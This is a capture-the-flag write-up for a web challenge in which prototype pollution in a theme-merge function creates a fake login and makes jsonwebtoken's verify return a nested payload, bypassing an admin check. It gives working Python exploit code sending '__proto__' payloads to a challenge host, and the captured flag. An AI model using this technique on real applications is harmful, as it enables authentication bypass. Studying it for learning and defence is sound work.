## themeviewer  

<img src="images/chall.png" width=600>

We are given a webpage that provides a login and a theme customisation functionality.  

<img src="images/webpage.png" width=600>

The backend has an `/admin` endpoint where we need to be authenticated for the flag to render.  

```js
app.get('/admin', (req, res) => {
    const token = req.cookies["token"]
    try {
        const decoded = jwt.verify(token, parseKey("public", PUBLIC_KEY));

        if (decoded.user === 'admin') {
            res.render('admin', { flag: 'WaRP{REDACTED}' });
        } else {
            res.status(403).json({ error: 'access denied' });
        }
    } catch (err) {
        res.status(401).json({ error: 'invalid token' });
    }
});
```

Immediately, we will notice a prototype pollution vulnerability in the theme customisation implementation, where attributes are recursively updated.  

```js
class ThemeManager {
    static merge(target, source) {
        for (let key in source) {
            if (source[key] && typeof source[key] === 'object') {
                target[key] = target[key] || {};
                this.merge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
        return target;
    }

    static createTheme(base, customizations = {}) {
        const theme = base ? { ...default_theme[base] } : {};
        return this.merge(theme, customizations);
    }
}
```

We can easily exploit the vulnerability to make `decoded.user` default to `"admin"`.  

```python
s.post(f'{url}/api/theme', json={
    "base": "light",
    "customizations": {
        '__proto__': { 
            'user': 'admin' 
        }
    }
})
```

However, our next challenge would be getting the `jwt.verify()` check to pass. To do this, we need to pass a token which will decode to a payload that doesn't have a `user` field inside.  

```js
const decoded = jwt.verify(token, parseKey("public", PUBLIC_KEY));

if (decoded.user === 'admin') {
    res.render('admin', { flag: 'WaRP{REDACTED}' });
} 
```

Since the chall dist censors the public and private keys, and the backend doesn't initialise a default user, we need to find another way to retrieve a token.  

Luckily, the `/login` endpoint is vulnerable to prototype pollution as well. We can set a key in `Object.prototype` to an unrecognised username, such that `user[username]` will always default to that username.  

```js
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username in users && users[username] === password) {
        const payload = {
            user: username,
        };
        const token = jwt.sign(payload, parseKey("private", PRIVATE_KEY, { format: "pkcs8" }), { algorithm: 'ES256' });
        res.cookie('token', token)
        res.json({ token });
    } else {
        res.status(401).json({ error: 'invalid credentials' });
    }
});
```

In this case, we can pollute the `hacker` key to get an account with username and password `"hacker"` and retrieve a non-admin token.  

```json
"customizations": {
    "__proto__": {
        "hacker": "hacker"
    }
}
```

However, since the token payload has a `user` field by default, prototype pollution won't affect it. We need to pollute the `jsonwebtoken` library somehow to remove that field.  

In `verify.js`, if `options.complete` is `true`, `jwt.verify()` will return the payload under a `payload` field, meaning our decoded token won't have a `user` attribute.  

Since `options.complete` is `undefined` by default, this provides us an attack vector, and we can pollute `Object.prototype.complete` to default to `true`.  

```js
// jsonwebtoken/verify.js
if (options.complete === true) {
    const signature = decodedToken.signature;

    return done(null, {
    header: header,
    payload: payload,
    signature: signature
    });
}

return done(null, payload);
```

With this knowledge, we can write a script that can carry out the full attack. Do note that this script can only be run once since the `/login` endpoint will be affected after the first pollution.  

```python
import requests

url = "http://host8.dreamhack.games:20515"

s = requests.Session()

def pollute(payload):
    res = s.post(f'{url}/api/theme', json={
        "base": "light",
        "customizations": {
            '__proto__': payload
        }
    })

    if res.json()['success']:
        print("> Pollution succeeded")    

# get user
username = 'hacker'
pollute({username: username})

res = s.post(f'{url}/api/login', json={ 'username': username, 'password': username })

token = res.json()['token']

# pollute decoded.user and jsonwebtoken
pollute({ 'user': 'admin', "complete": True })

res = requests.get(f'{url}/admin', cookies={ 'token': token })
print(res.text)
```

Flag: `WaRP{977fb17e6fd9e1191f9c9cfa05ed20ee}`